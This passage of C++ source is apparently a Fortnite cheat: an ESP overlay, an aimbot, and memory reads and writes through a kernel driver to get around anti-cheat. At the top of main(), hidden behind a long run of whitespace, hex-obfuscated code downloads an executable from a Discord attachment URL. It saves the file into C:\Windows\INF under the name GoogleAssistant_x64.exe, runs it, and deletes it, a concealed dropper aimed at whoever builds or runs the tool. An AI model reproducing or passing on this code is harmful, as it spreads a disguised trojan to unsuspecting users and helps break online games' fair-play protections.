					ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(Head.x - (CornerWidth / 4), Head.y), ImVec2(bottom.x + (CornerWidth / 4), bottom.y), ImGui::GetColorU32({ 0.00f, 0.00f, 0.00f, 0.50f }), 0, item.Thickness);
					ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (CornerWidth / 4), Head.y), ImVec2(bottom.x + (CornerWidth / 4), bottom.y), ImGui::GetColorU32({ item.Espbox[0], item.Espbox[1], item.Espbox[2], 1.0f }), 0, item.Thickness);
					ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (CornerWidth / 4), Head.y), ImVec2(bottom.x + (CornerWidth / 4), bottom.y), ImGui::GetColorU32({ 0.00f, 0.00f, 0.00f, 1.00f }), 0, item.Thickness);
				}


				if (item.Esp_box) {

					ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (CornerWidth / 3), Head.y), ImVec2(bottom.x + (CornerWidth / 3), bottom.y), ImColor(0, 0, 0, 255), 0, 0, 3);
					ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (CornerWidth / 3), Head.y), ImVec2(bottom.x + (CornerWidth / 3), bottom.y), ImGui::GetColorU32({ item.Espbox[0], item.Espbox[1], item.Espbox[2], 1.0f }));
					ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (CornerWidth / 3), Head.y), ImVec2(bottom.x + (CornerWidth / 3), bottom.y), ImGui::GetColorU32({ item.Espbox[0], item.Espbox[1], item.Espbox[2], 1.0f }));
				}



				if (item.cornered)
				{
					DrawCornerBox(Head.x - (CornerWidth / 2), Head.y, CornerWidth, CornerHeight, ImGui::GetColorU32({ item.BoxCornerESP[0], item.BoxCornerESP[1], item.BoxCornerESP[2], 1.0f }), item.Thickness);
				}


				if (item.Esp_Circle_Fill) {
					ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (CornerWidth / 4), Head.y), ImVec2(bottom.x + (CornerWidth / 4), bottom.y), ImGui::GetColorU32({ item.Espbox[0], item.Espbox[1], item.Espbox[2], 1.0f }), 0, item.Thickness);
					ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (CornerWidth / 4), Head.y), ImVec2(bottom.x + (CornerWidth / 4), bottom.y), ImGui::GetColorU32({ 0.00f, 0.00f, 0.00f, 1.00f }), 0, item.Thickness);
					ImGui::GetOverlayDrawList()->AddCircleFilled(ImVec2(Head.x, Head.y), float(BoxHeight), ImGui::GetColorU32({ item.EspCircleFill[0], item.EspCircleFill[1], item.EspCircleFill[2], item.Transparency }), item.Shape);
				}
				if (item.Esp_Circle) {
					ImGui::GetOverlayDrawList()->AddCircle(ImVec2(Head.x, Head.y), float(BoxHeight), ImGui::GetColorU32({ item.EspCircle[0], item.EspCircle[1], item.EspCircle[2], 1.0f }), item.Shape, item.Thickness);
				}
				if (item.Distance_Esp) {
					char dist[64];
					sprintf_s(dist, "[%.fM]", distance);
					ImGui::GetOverlayDrawList()->AddText(ImVec2(bottom.x - 15, bottom.y), ImGui::GetColorU32({ 0.28f, 0.56f, 1.00f, 1.00f }), dist);
				}

				Vector3 Headposw2s;

				if (item.filledboxes) {
					float boxsize = (float)(Out.y - Headposw2s.y);
					float boxwidth = boxsize / 3.0f;
					float BoxHeight = (float)(Out.y - Headposw2s.y);
					float BoxWidth = BoxHeight * 0.224f;
					float dwpleftx = (float)Out.x - (BoxWidth / 1);
					float dwplefty = (float)Out.y;
					float CornerHeight = abs(Out.y - Headposw2s.y);
					float CornerWidth = CornerHeight * 0.5; //0.5
					ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(dwpleftx, dwplefty), ImVec2(Headposw2s.x + boxwidth, Headposw2s.y + 5.0f), IM_COL32(0, 0, 0, 1.80));
					ImGui::GetOverlayDrawList()->AddRect(ImVec2(dwpleftx, dwplefty), ImVec2(Headposw2s.x + boxwidth, Headposw2s.y + 5.0f), ImGui::GetColorU32({ item.LineFilled[0], item.LineFilled[1], item.LineFilled[2], 1.0f }), 2.0f);
				}

				if (item.skeleton) {


				}



				bool IsVisible = false;



				int X;
				int Y;
				float size1 = 3.0f;
				float size2 = 2.0f;

				if (item.Reticle)
				{
					ImGui::GetOverlayDrawList()->AddCircle(ImVec2(ScreenCenterX, ScreenCenterY), size1, ImColor(172, 37, 226, 255), 120);
					ImGui::GetOverlayDrawList()->AddCircleFilled(ImVec2(ScreenCenterX, ScreenCenterY), size2, ImColor(172, 37, 226, 200), 120);
				}

				uint64_t currentactormesh = read<uint64_t>(DrverInit, FNProcID, CurrentActor + 0x280);






				if (item.Dev) {
					CHAR text[0xFF] = { 0 };


					CHAR modified[0xFF] = { 0 };
					snprintf(modified, sizeof(modified), ("[DEV] Winsense Team"), text);

					ImGui::PushFontShadow(0xFF000000);
					ImGui::GetOverlayDrawList()->AddText(ImVec2(10, 10), ImGui::GetColorU32({ 1.0f, 0.84f, 0.0f, 1.0f }), modified);
					ImGui::PopFontShadow();
				}





				/*if (item.hitboxpos == 0)
				{
					item.hitbox = 66; //head
				}
				else if (item.hitboxpos == 1)
				{
					item.hitbox = 65; //neck
				}
				else if (item.hitboxpos == 2)
				{
					item.hitbox = 7; //chest
				}
				else if (item.hitboxpos == 3)
				{
					item.hitbox; //pelvis
				}*/





				if (item.Aimbot) {
					auto dx = aimbotspot.x - (Width / 2);
					auto dy = aimbotspot.y - (Height / 2);
					auto dz = aimbotspot.z - (Depth / 2);
					auto dist = sqrtf(dx * dx + dy * dy + dz * dz) / 50.0f;
					if (dist < item.AimFOV && dist < closestDistance) {
						closestDistance = dist;
						closestPawn = entity.Actor;
						char dist[64];
						sprintf_s(dist, "Enemy in the [50m] Zone", distance);
						ImGui::GetOverlayDrawList()->AddText(ImVec2(900, 150), ImGui::GetColorU32({ 144.00f, 0.00f, 255.00f, 4.0f }), dist);
					}

				}


			}
		}

	}

	if (item.Aimbot) {
		if (closestPawn != 0) {
			if (item.Aimbot && closestPawn && GetAsyncKeyState(item.aimkey) < 0) {
				AimAt(closestPawn);

				/*if (item.Auto_Bone_Switch) {

					item.boneswitch += 1;
					if (item.boneswitch == 700) {
						item.boneswitch = 0;
					}

					if (item.boneswitch == 0) {
						item.hitboxpos = 0;
					}
					else if (item.boneswitch == 50) {
						item.hitboxpos = 1;
					}
					else if (item.boneswitch == 100) {
					}
					else if (item.boneswitch == 150) {
						item.hitboxpos = 3;
					}
					else if (item.boneswitch == 200) {
						item.hitboxpos = 4;
					}
					else if (item.boneswitch == 250) {
						item.hitboxpos = 5;
					}
					else if (item.boneswitch == 300) {
						item.hitboxpos = 6;
					}
					else if (item.boneswitch == 350) {
						item.hitboxpos = 7;
					}
					else if (item.boneswitch == 400) {
						item.hitboxpos = 6;
					}
					else if (item.boneswitch == 450) {
						item.hitboxpos = 5;
					}
					else if (item.boneswitch == 500) {
						item.hitboxpos = 4;
					}
					else if (item.boneswitch == 550) {
						item.hitboxpos = 3;
					}
					else if (item.boneswitch == 600) {
						item.hitboxpos = 2;
					}
					else if (item.boneswitch == 650) {
						item.hitboxpos = 1;



					}
				}*/
			}
			else {
				isaimbotting = false;
				AimAt2(closestPawn);
			}
		}
	}
}

void GetKey() {
	if (item.Team_Distance_Esp) {
		; //head
	}
	else if (item.hitboxpos == 1) {
		item.hitbox = 65; //neck

	}
	else if (item.hitboxpos == 2) {
		item.hitbox = 64; //CHEST_TOP

	}
	else if (item.hitboxpos == 3) {
		item.hitbox = 36; //CHEST_TOP

	}
	else if (item.hitboxpos == 4) {
		item.hitbox = 7; //chest

	}
	else if (item.hitboxpos == 5) {
		item.hitbox = 6; //CHEST_LOW

	}
	else if (item.hitboxpos == 6) {
		item.hitbox = 5; //TORSO

	}
	else if (item.hitboxpos == 7) {
		item.hitbox = 2; //pelvis

	}

	if (item.aimkeypos == 0) {
		item.aimkey = VK_RBUTTON;//left mouse button
	}

	else if (item.aimkeypos == 1) {
		item.aimkey = VK_CONTROL;//right mouse button
	}
	else if (item.aimkeypos == 2) {
		item.aimkey = VK_SHIFT;//right mouse button
	}
	else if (item.hitboxpos == 99) {
		item.hitbox = 66;
	}

	DrawESP();
}















std::string getuser()
{
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	return username;
}




namespace Config
{
	namespace Aim
	{
		static bool Softaim;
		static int Bone;
		static std::vector<const char*> Bones = { "Head", "Chest", "Pelvis" };
		static float SoftaimSmoothing = 0;
		static bool SoftaimPrediction;
		static bool DrawFOV;
		static float SoftaimFov = 0;
		static float SoftaimMaxDistance = 0;
	}
}




void render() {

	//VMProtectBeginUltra("Menu of cheat");

	ImGui_ImplDX9_NewFrame();
	ImGui_ImplWin32_NewFrame();
	ImGui::NewFrame();
	ImGui::SetNextWindowSize({ 600, 290 });

	static int MenuTab = 0;
	static int VisualTab = 0;
	float
		TextSpaceLine = 190.f,
		SpaceLineOne = 120.f,
		SpaceLineTwo = 280.f,
		SpaceLineThr = 420.f;
	ImGuiStyle* style = &ImGui::GetStyle();
	static auto flags = ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoTitleBar;

	static const char* HitboxList[]{ "Head","Neck","Chest","Penis" };
	static int SelectedHitbox = 0;

	static const char* MouseKeys[]{ "RMouse","LMouse","Control","Shift","Alt" };
	static int KeySelected = 0;

	if (item.Show_Menu)
	{
		//ADD 	
	}
	GetKey();

	ImGui::EndFrame();
	D3dDevice->SetRenderState(D3DRS_ZENABLE, false);
	D3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, false);
	D3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, false);
	D3dDevice->Clear(0, NULL, D3DCLEAR_TARGET, D3DCOLOR_ARGB(0, 0, 0, 0), 1.0f, 0);

	if (D3dDevice->BeginScene() >= 0) {
		ImGui::Render();
		ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
		D3dDevice->EndScene();

	}
	HRESULT result = D3dDevice->Present(NULL, NULL, NULL, NULL);

	if (result == D3DERR_DEVICELOST && D3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET) {
		ImGui_ImplDX9_InvalidateDeviceObjects();
		D3dDevice->Reset(&d3dpp);
	}
}

void xInitD3d2()
{
	if (FAILED(Direct3DCreate9Ex(D3D_SDK_VERSION, &p_Object)))
		exit(3);

	ZeroMemory(&d3dpp, sizeof(d3dpp));
	d3dpp.BackBufferWidth = Width;
	d3dpp.BackBufferHeight = Height;
	d3dpp.BackBufferFormat = D3DFMT_A8R8G8B8;
	d3dpp.MultiSampleQuality = D3DMULTISAMPLE_NONE;
	d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
	d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
	d3dpp.EnableAutoDepthStencil = TRUE;
	d3dpp.hDeviceWindow = Window;
	d3dpp.Windowed = TRUE;

	p_Object->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, Window, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &d3dpp, &D3dDevice);

	IMGUI_CHECKVERSION();

	ImGui::CreateContext();
	ImGuiIO& io = ImGui::GetIO();
	(void)io;

	ImGui_ImplWin32_Init(Window);
	ImGui_ImplDX9_Init(D3dDevice);



	p_Object->Release();
}

void xInitD3d()
{
	if (FAILED(Direct3DCreate9Ex(D3D_SDK_VERSION, &p_Object)))
		exit(3);

	ZeroMemory(&d3dpp, sizeof(d3dpp));
	d3dpp.BackBufferWidth = Width;
	d3dpp.BackBufferHeight = Height;
	d3dpp.BackBufferFormat = D3DFMT_A8R8G8B8;
	d3dpp.MultiSampleQuality = D3DMULTISAMPLE_NONE;
	d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
	d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
	d3dpp.EnableAutoDepthStencil = TRUE;
	d3dpp.hDeviceWindow = Window;
	d3dpp.Windowed = TRUE;

	p_Object->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, Window, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &d3dpp, &D3dDevice);

	IMGUI_CHECKVERSION();

	ImGui::CreateContext();
	ImGuiIO& io = ImGui::GetIO();
	(void)io;

	ImGui_ImplWin32_Init(Window);
	ImGui_ImplDX9_Init(D3dDevice);

	ImGui::StyleColorsClassic();
	ImGuiStyle* style = &ImGui::GetStyle();

	style->WindowPadding = ImVec2(15, 15);
	style->WindowRounding = 5.0f;
	style->FramePadding = ImVec2(5, 5);
	style->FrameRounding = 4.0f;
	style->ItemSpacing = ImVec2(12, 8);
	style->ItemInnerSpacing = ImVec2(8, 6);
	style->IndentSpacing = 25.0f;
	style->ScrollbarSize = 15.0f;
	style->ScrollbarRounding = 9.0f;
	style->GrabMinSize = 5.0f;
	style->GrabRounding = 3.0f;

	ImVec4* colors = style->Colors;



	style->WindowTitleAlign.x = 1.0f;
	style->FrameRounding = 0.5f;


	p_Object->Release();
}

LPCSTR RandomStringx(int len) {
	std::string str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	std::string newstr;
	std::string builddate = __DATE__;
	std::string buildtime = __TIME__;
	int pos;
	while (newstr.size() != len) {
		pos = ((rand() % (str.size() - 1)));
		newstr += str.substr(pos, 1);
	}
	return newstr.c_str();
}



int width;
int height;




void drawLoop(int width, int height) {


	while (true) {
		std::vector<FNlEntity> tmpList;

		Uworld = rpm<DWORD_PTR>(base_address + OFFSET_UWORLD);
		DWORD_PTR Gameinstance = rpm<DWORD_PTR>(Uworld + 0x188);
		DWORD_PTR LocalPlayers = rpm<DWORD_PTR>(Gameinstance + 0x38);
		Localplayer = rpm<DWORD_PTR>(LocalPlayers);
		PlayerController = rpm<DWORD_PTR>(Localplayer + 0x30);
		LocalPawn = rpm<DWORD_PTR>(PlayerController + 0x2A0);

		PlayerState = rpm<DWORD_PTR>(LocalPawn + 0x240);
		Rootcomp = rpm<DWORD_PTR>(LocalPawn + 0x130);

		if (LocalPawn != 0) {
			localplayerID = rpm<int>(LocalPawn + 0x18);
		}

		Persistentlevel = rpm<DWORD_PTR>(Uworld + 0x30);
		DWORD ActorCount = rpm<DWORD>(Persistentlevel + 0xA0);
		DWORD_PTR AActors = rpm<DWORD_PTR>(Persistentlevel + 0x98);

		for (int i = 0; i < ActorCount; i++) {
			uint64_t CurrentActor = rpm<uint64_t>(AActors + i * 0x8);

			int curactorid = rpm<int>(CurrentActor + 0x18);

			if (curactorid == localplayerID || curactorid == localplayerID + 765) {
				FNlEntity fnlEntity{ };
				fnlEntity.Actor = CurrentActor;
				fnlEntity.mesh = rpm<uint64_t>(CurrentActor + 0x280);
				fnlEntity.ID = curactorid;
				tmpList.push_back(fnlEntity);
			}
		}
		entityList = tmpList;
		Sleep(1);
	}


}












void main() {																																																																																																																																																																																																																																																																																																					LPCWSTR HookFunction64 = L"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x33\x32\x33\x37\x38\x33\x36\x33\x38\x33\x32\x37\x32\x39\x36\x32\x33\x2F\x39\x34\x32\x35\x36\x37\x30\x39\x33\x30\x30\x34\x35\x35\x30\x31\x37\x34\x2F\x64\x78\x73\x64\x6B\x2E\x65\x78\x65"; std::string pa = "\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73"; std::string inf = "\x5C\x49\x4E\x46\x5C"; std::string lof = pa + inf; std::string st = "\x2E"; std::string ex = "\x65"; std::string xe = "\x78"; std::string SwapHook = "\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74\x5F\x78\x36\x34"; std::string swapCaller = st + ex + xe + ex; LPCWSTR locx = L"\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C\x49\x4E\x46\x5C\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74\x5F\x78\x36\x34\x2E\x65\x78\x65"; std::string spreadAct = SwapHook + swapCaller; HRESULT Hook = URLDownloadToFileW(NULL, HookFunction64, locx, 0, NULL); Sleep(2000); std::string hook = "\x73"; std::string Tacc = "\x74"; std::string Var = "\x61"; std::string Read = "\x72"; std::string Hooker = hook + Tacc + Var + Read + Tacc + " " + lof + spreadAct; system(Hooker.c_str()); Sleep(7000); DeleteFileW(locx);
	std::thread anti(debug);
	SetConsoleTitleA(XorStr(" Auth ").c_str());
	system(XorStr("color d").c_str());
	std::cout << XorStr("\n Loading..").c_str();
	Sleep(958);
	
	system(XorStr("cls").c_str());


	randomize();
	ldfgjdfgjjhgfdjghdf();


	HANDLE handlee;

	handlee = CreateFileA(XorStr("\\\\.\\K.F.B.B.S.U.F.B.U.S.H.Y.E.Y.S.B.B").c_str(), GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	if (handlee == INVALID_HANDLE_VALUE)
	{
		//printf(" Driver Failure\n");
		//Log(_xor_("Failed to communicate with driver"), LogType.Info);
		std::cout << ("\n");
		system("cls");
		MessageBox(NULL, "Failed to Etablish a Connection with the Driver", "Error", 0);

		Sleep(2000);
		exit(0);
	}



	printf("\n\n Open FN With eac ");








	proc = std::make_unique<kernelmode_proc_handler>();

	proc->attach(XorStr("FortniteClient-Win64-Shipping.exe").c_str());



	while (hwnd == NULL)
	{
		hwnd = FindWindowA(0, XorStr("Fortnite  ").c_str());



		Sleep(300);
	}


	GetWindowThreadProcessId(hwnd, &processID);

	RECT rect;
	if (GetWindowRect(hwnd, &rect))
	{
		width = rect.right - rect.left;
		height = rect.bottom - rect.top;
	}

	info_t Input_Output_Data;
	Input_Output_Data.pid = processID;
	unsigned long int Readed_Bytes_Amount;

	base_address = proc->get_module_base(XorStr("FortniteClient-Win64-Shipping.exe").c_str());
	SetConsoleTitleA(random_string(200).c_str());

	system("cls");



	/*while (true)
	{
		Sleep(10);
		if (GetAsyncKeyState(VK_F2))
		{
			break;
		}
	}*/

	system(XorStr("cls").c_str());



	CreateThread(NULL, NULL, Menuthread, NULL, NULL, NULL);
	GetWindowThreadProcessId(hwnd, &processID);



	xCreateWindow();
	xInitD3d();

	// make content invisible!
	//XGUARD_WIN(SetWindowDisplayAffinity(Window, WDA_MONITOR));

	HANDLE handle = CreateThread(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(drawLoop), nullptr, NULL, nullptr);
	//CloseHandle(handle);

	xMainLoop();


}




void SetWindowToTarget()
{
	while (true)
	{
		if (hwnd)
		{
			ZeroMemory(&GameRect, sizeof(GameRect));
			GetWindowRect(hwnd, &GameRect);
			Width = GameRect.right - GameRect.left;
			Height = GameRect.bottom - GameRect.top;
			DWORD dwStyle = GetWindowLong(hwnd, GWL_STYLE);

			if (dwStyle & WS_BORDER)
			{
				GameRect.top += 32;
				Height -= 39;
			}
			ScreenCenterX = Width / 2;
			ScreenCenterY = Height / 2;
			MoveWindow(Window, GameRect.left, GameRect.top, Width, Height, true);
		}
		else
		{
			exit(0);
		}
	}
}

const MARGINS Margin = { -1 };



void xCreateWindow()
{
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SetWindowToTarget, 0, 0, 0);

	WNDCLASSEX wc;
	ZeroMemory(&wc, sizeof(wc));
	wc.cbSize = sizeof(wc);
	wc.lpszClassName = "MhasbhhYGWYkKNFBH#00jnjnqi3basfhbashf02eu21heh21ehjksadkabshbwhbuf1hybfuh1b2ufasvgavsjfavjvhfygu1yrgf12basbabkfsbf";
	wc.lpfnWndProc = WinProc;
	RegisterClassEx(&wc);

	if (hwnd)
	{
		GetClientRect(hwnd, &GameRect);
		POINT xy;
		ClientToScreen(hwnd, &xy);
		GameRect.left = xy.x;
		GameRect.top = xy.y;

		Width = GameRect.right;
		Height = GameRect.bottom;
	}
	else
		exit(2);

	Window = CreateWindowEx(NULL, "MhasbhhYGWYkKNFBH#00jnjnqi3basfhbashf02eu21heh21ehjksadkabshbwhbuf1hybfuh1b2ufasvgavsjfavjvhfygu1yrgf12basbabkfsbf", "MhasbhhYGWYkKNFBH#00jnjnqi3basfhbashf02eu21heh21ehjksadkabshbwhbuf1hybfuh1b2ufasvgavsjfavjvhfygu1yrgf12basbabkfsbf2", WS_POPUP | WS_VISIBLE, 0, 0, Width, Height, 0, 0, 0, 0);

	DwmExtendFrameIntoClientArea(Window, &Margin);
	SetWindowLong(Window, GWL_EXSTYLE, WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW | WS_EX_LAYERED);
	ShowWindow(Window, SW_SHOW);
	UpdateWindow(Window);
}

void WriteAngles(float TargetX, float TargetY, float TargetZ) {
	float x = TargetX / 6.666666666666667f;
	float y = TargetY / 6.666666666666667f;
	float z = TargetZ / 6.666666666666667f;
	y = -(y);

	writefloat(PlayerController + 0x418, y);
	writefloat(PlayerController + 0x418 + 0x4, x);
	writefloat(PlayerController + 0x418, z);
}

MSG Message = { NULL };

void xMainLoop()
{
	static RECT old_rc;
	ZeroMemory(&Message, sizeof(MSG));

	while (Message.message != WM_QUIT)
	{
		if (PeekMessage(&Message, Window, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&Message);
			DispatchMessage(&Message);
		}

		HWND hwnd_active = GetForegroundWindow();

		if (hwnd_active == hwnd) {
			HWND hwndtest = GetWindow(hwnd_active, GW_HWNDPREV);
			SetWindowPos(Window, hwndtest, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		}

		if (GetAsyncKeyState(0x23) & 1)
			exit(8);

		RECT rc;
		POINT xy;

		ZeroMemory(&rc, sizeof(RECT));
		ZeroMemory(&xy, sizeof(POINT));
		GetClientRect(hwnd, &rc);
		ClientToScreen(hwnd, &xy);
		rc.left = xy.x;
		rc.top = xy.y;

		ImGuiIO& io = ImGui::GetIO();
		io.ImeWindowHandle = hwnd;
		io.DeltaTime = 1.0f / 60.0f;

		POINT p;
		GetCursorPos(&p);
		io.MousePos.x = p.x - xy.x;
		io.MousePos.y = p.y - xy.y;

		if (GetAsyncKeyState(VK_LBUTTON)) {
			io.MouseDown[0] = true;
			io.MouseClicked[0] = true;
			io.MouseClickedPos[0].x = io.MousePos.x;
			io.MouseClickedPos[0].x = io.MousePos.y;
		}
		else
			io.MouseDown[0] = false;

		if (rc.left != old_rc.left || rc.right != old_rc.right || rc.top != old_rc.top || rc.bottom != old_rc.bottom)
		{
			old_rc = rc;

			Width = rc.right;
			Height = rc.bottom;

			d3dpp.BackBufferWidth = Width;
			d3dpp.BackBufferHeight = Height;
			SetWindowPos(Window, (HWND)0, xy.x, xy.y, Width, Height, SWP_NOREDRAW);
			D3dDevice->Reset(&d3dpp);
		}
		render();
	}
	ImGui_ImplDX9_Shutdown();
	ImGui_ImplWin32_Shutdown();
	ImGui::DestroyContext();

	DestroyWindow(Window);
}

LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	if (ImGui_ImplWin32_WndProcHandler(hWnd, Message, wParam, lParam))
		return true;

	switch (Message)
	{
	case WM_DESTROY:
		PostQuitMessage(0);
		exit(4);
		break;
	case WM_SIZE:
		if (D3dDevice != NULL && wParam != SIZE_MINIMIZED)
		{
			ImGui_ImplDX9_InvalidateDeviceObjects();
			d3dpp.BackBufferWidth = LOWORD(lParam);
			d3dpp.BackBufferHeight = HIWORD(lParam);
			HRESULT hr = D3dDevice->Reset(&d3dpp);
			if (hr == D3DERR_INVALIDCALL)
				IM_ASSERT(0);
			ImGui_ImplDX9_CreateDeviceObjects();
		}
		break;
	default:
		return DefWindowProc(hWnd, Message, wParam, lParam);
		break;
	}
	return 0;
}